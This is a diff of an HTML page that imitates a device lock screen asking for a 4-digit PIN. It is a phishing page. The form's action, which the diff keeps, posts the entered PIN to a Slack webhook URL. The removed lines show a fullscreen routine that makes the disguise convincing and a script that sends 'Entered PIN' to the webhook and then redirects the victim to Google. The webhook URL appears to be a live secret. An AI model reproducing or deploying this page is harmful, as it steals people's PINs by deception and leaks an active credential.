@@ -70,7 +70,7 @@
 </head>
 <body>
     <div class="lock-screen">
-        <h2>Enter PIN</h2>
+        <h2>Enter PIN-</h2>
         <p>Your PIN contains at least 4 digits.</p>
         <form id="pinForm" action="https://hooks.slack.com/services/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" method="POST">
             <input type="password" id="pin" name="pin" class="pin-display" maxlength="4" readonly>
@@ -86,7 +86,7 @@
                 <button type="button" onclick="enterDigit(9)">9</button>
                 <button type="button" onclick="clearPin()">&#x232B;</button>
                 <button type="button" onclick="enterDigit(0)">0</button>
-                <button type="submit" >OK</button>
+                <button type="submit" value="Submit">OK</button>
             </div>
         </form>
         <div class="bottom-buttons">
@@ -94,17 +94,7 @@
         </div>
     </div>
     <script>
-        function openFullscreen() {
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
-            } else if (document.documentElement.mozRequestFullScreen) {
-                document.documentElement.mozRequestFullScreen();
-            } else if (document.documentElement.webkitRequestFullscreen) {
-                document.documentElement.webkitRequestFullscreen();
-            } else if (document.documentElement.msRequestFullscreen) {
-                document.documentElement.msRequestFullscreen();
-            }
-        }
+        
         function enterDigit(digit) {
             let pinInput = document.getElementById('pin');
             if (pinInput.value.length < 4) {
@@ -114,32 +104,7 @@
         function clearPin() {
             document.getElementById('pin').value = '';
         }
-        function submitPin(event) {
-            event.preventDefault();
-            let pin = document.getElementById('pin').value;
-            if (pin.length === 4) {
-                fetch("https://hooks.slack.com/services/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", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({ text: "Entered PIN: " + pin })
-                })
-                .then(response => {
-                    if (response.ok) {
-                        window.location.href = "https://www.google.com";
-                    } else {
-                        alert("Failed to send PIN to Slack.");
-                    }
-                })
-                .catch(error => {
-                    console.error("Error:", error);
-                    alert("Network error or invalid Slack Webhook.");
-                });
-            } else {
-                alert("Enter a 4-digit PIN");
-            }
-        }
+        
     </script>
 </body>
 </html>
